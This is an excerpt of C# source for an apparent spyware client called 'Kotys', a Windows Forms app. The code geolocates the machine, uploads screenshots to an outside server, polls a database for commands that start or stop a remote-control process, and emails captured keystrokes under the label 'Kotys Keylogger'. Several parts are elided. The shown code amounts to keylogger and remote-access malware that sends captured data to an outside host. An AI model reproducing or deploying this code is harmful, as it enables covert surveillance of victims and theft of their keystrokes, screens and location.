...
namespace Kotys
{
    public partial class Form1 : MetroForm
    {
        ...
        public void getLocation()
        {
            ...
            string get = wc.DownloadString("http://ip-api.com/csv");
            string[] sep = get.Split(',');
            string lat = sep[7];
            string longit = sep[8];
            DateTime dateTime = DateTime.UtcNow.Date;
            string data = dateTime.ToString("dd/MM/yyyy");
            string time = DateTime.Now.ToString("h:mm:ss");
            dbConnect.UpdateLastLocation(deviceID, lat + ", " + longit);
            writeLog(deviceID, "Location:"+lat+", " + longit, data, time);
            dbConnect.InsertReport(deviceID, "Location:" + lat + ", " + longit, data, time);
...
//worng one
        ...
        public void uploadSS(string dir, string name)
        {
            ...
            byte[] result = Client.UploadFile("http://zamolxis.org/dev/kotys/uploadss.php", "POST", dir);
            String s = System.Text.Encoding .UTF8 .GetString (result,0,result.Length );
           
            dbConnect.InsertReport(deviceID, "Screenshot taken", data, time);
            int lastId = dbConnect.getLastReportRepID(deviceID);
            dbConnect.InsertReportInfo(lastId.ToString(), "Screenshot take", "http://zamolxis.org/dev/kotys/ss/" + name, "");
        ...
        private void timer1_Tick(object sender, EventArgs e)
        {
            ...
            if (get != "")
            {
                ...
                switch (command.Substring(0, 3))
                {
                    ...
                    case "376": dbConnect.InsertReport(deviceID, "RemoteControlStarted", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "RemoteControlStarted", data, time); startRemote(); break;
                    case "377": dbConnect.InsertReport(deviceID, "RemoteControlStoped", data, time); dbConnect.setCommandAsDone(identity); writeLog(deviceID, "RemoteControlStoped", data, time); stopRemote(); break;
                    case "219": getLocation(); dbConnect.setCommandAsDone(identity); break;
                }
            }
        ...
        void sendEmailWithKeys(string email)
        {
            ...
            {
                Subject = deviceID + " - Kotys Keylogger at " + dt,
        ...
        void startRemote()
        {
            Process[] pname = Process.GetProcessesByName("RemoteServer.exe");
            if (pname.Length == 0)
                Process.Start("RemoteServer.exe");
            
        }

        void stopRemote()
        {
            foreach (var process in Process.GetProcessesByName("RemoteServer.exe"))
            {
                process.Kill();
            }
            foreach (var process in Process.GetProcessesByName("pchecker.exe"))
            {
                process.Kill();
            }
